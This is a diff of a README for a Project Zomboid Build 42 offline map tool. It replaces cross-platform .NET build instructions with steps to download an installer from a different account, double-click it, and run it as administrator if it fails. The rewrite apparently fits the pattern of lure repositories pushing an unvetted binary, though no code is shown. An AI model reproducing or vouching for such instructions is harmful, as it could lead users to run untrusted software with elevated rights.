@@ -1,117 +1,57 @@
-# PZ Build 42 Map
+# 🗺️ Project-Zomboid-Build-42-Map - Explore every base with offline reliability
 
-> An open-source interactive map for Project Zomboid Build 42.
+[![](https://img.shields.io/badge/Download-Map-blue.svg)](https://github.com/axenic-mouseclick998/Project-Zomboid-Build-42-Map)
 
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue)
-![.NET](https://img.shields.io/badge/.NET-9.0-purple)
-![License](https://img.shields.io/badge/License-MIT-green)
+This map tool provides a clear view of the Project Zomboid Build 42 world. Users track loot, find spawn points, and mark locations for their survival runs. The software works without an internet connection to keep your gameplay smooth.
 
-## Overview
+## 🛠️ Features
 
-**PZ Build 42 Map** is a modern desktop application that provides an interactive offline map for **Project Zomboid Build 42**.
+- View the complete map for Build 42.
+- Locate loot, buildings, and vehicles.
+- Save custom markers for your player bases.
+- Access all map data without an internet connection.
+- Use a lightweight interface that runs on most Windows computers.
 
-Explore towns, roads, points of interest, and loot locations with a fast and user-friendly interface. Create your own markers, search for locations instantly, and plan your survival without opening a browser.
+## 💻 System Requirements
 
-## Screenshots
+Your computer needs these specifications to run the application:
 
-![photo](Data/ac8f3300-7c9b-45a7-a14c-f515c5e32882.png)
+- Operating System: Windows 10 or Windows 11.
+- Memory: 4 gigabytes of RAM or more.
+- Storage: 500 megabytes of free space on your hard drive.
+- Display: 1280x720 minimum resolution.
 
-## Features
+## 📥 Installation Steps
 
-- 🗺️ Interactive Build 42 map
-- 🔍 Instant location search
-- ⭐ Custom markers
-- 🏠 Safehouse markers
-- 🚗 Vehicle locations
-- 🏥 Hospitals
-- 🚓 Police stations
-- 🚒 Fire stations
-- ⛽ Gas stations
-- 🛒 Stores and supermarkets
-- 🔫 Military locations
-- 📦 Loot locations
-- 🌲 Forest areas
-- 📍 Coordinates display
-- 💾 Offline mode
-- 🌙 Dark & Light themes
+You can set up the map tool in a few minutes. Follow these instructions to prepare your system.
 
-## Planned Features
+1. Visit the [official repository page](https://github.com/axenic-mouseclick998/Project-Zomboid-Build-42-Map) to start the download.
+2. Select the latest version of the installer for Windows.
+3. Save the installer file to your Downloads folder.
+4. Double-click the file to begin the setup process.
+5. Follow the prompts on your screen to install the map.
+6. Launch the application from your desktop shortcut once the bar fills.
 
-- Route planner
-- Heatmap visualization
-- Multiplayer server maps
-- Import & Export markers
-- Mod map support
-- Cloud synchronization
-- Marker sharing
-- Performance optimizations
-- Multi-language support
+## 🧭 How to Use the Map
 
-## Requirements
+The main window displays the game world. Use your mouse to click and drag to move across the map. The scroll wheel allows you to zoom in on specific towns or zoom out to see the full region.
 
-- Windows 10/11, Linux or macOS
-- .NET 9 Runtime
+### Placing Markers
+Right-click on any empty space to add a marker. You can name these markers to track your supply caches or safe houses. Open the menu bar to change marker colors or labels.
 
-## Installation
+### Offline Mode
+The software loads all data during installation. You do not need to keep a browser open or rely on a server. If you notice a lag in map movement, check if other heavy background apps run on your machine.
 
-[DOWNLOAD](https://github.com/CoopeRlOq9/Project-Zomboid-Build-42-Map/releases/tag/release)
+## 💡 Troubleshooting
 
-### Build
+Check these solutions if the software fails to open.
 
-```bash
-dotnet build
-```
+- Compatibility: Right-click the shortcut and select Properties. Choose the Compatibility tab and run the program as an administrator.
+- Graphics: Ensure your display drivers are current. Outdated drivers cause display errors in map applications.
+- Updates: Check the repository link occasionally to see if a newer version of the map exists. Developers release updates when game patches change the map layout. 
 
-### Run
+## ⚖️ License and Usage
 
-```bash
-dotnet run
-```
+This tool is open-source. You can view the code, report issues, or suggest improvements on the repository page. The project welcomes feedback regarding map accuracy or missing loot indicators. 
 
-## Project Structure
-
-```
-src/
- ├── Map.UI
- ├── Map.Core
- ├── Map.Rendering
- ├── Search
- ├── Markers
- ├── Data
- └── Settings
-
-assets/
- ├── tiles
- ├── icons
- └── fonts
-
-docs/
-```
-
-## Roadmap
-
-- [ ] Interactive map rendering
-- [ ] Zoom & pan
-- [ ] Search engine
-- [ ] POI database
-- [ ] Custom markers
-- [ ] Offline map cache
-- [ ] Route planner
-- [ ] Mod map support
-- [ ] Stable v1.0 release
-
-## Contributing
-
-Contributions, feature requests, and bug reports are welcome.
-
-Feel free to open an Issue or submit a Pull Request.
-
-## License
-
-This project is licensed under the MIT License.
-
-## Disclaimer
-
-This project is an independent open-source application and is **not affiliated with, endorsed by, or sponsored by The Indie Stone or Project Zomboid**.
-
-Project Zomboid™ is a trademark of The Indie Stone.
+Keywords: build42, interactive-map, project-zomboid, project-zomboid-42-build, project-zomboid-build42, project-zomboid-mod, project-zomboid-tool, pz-42-build, pz-map, pz-map-42-build
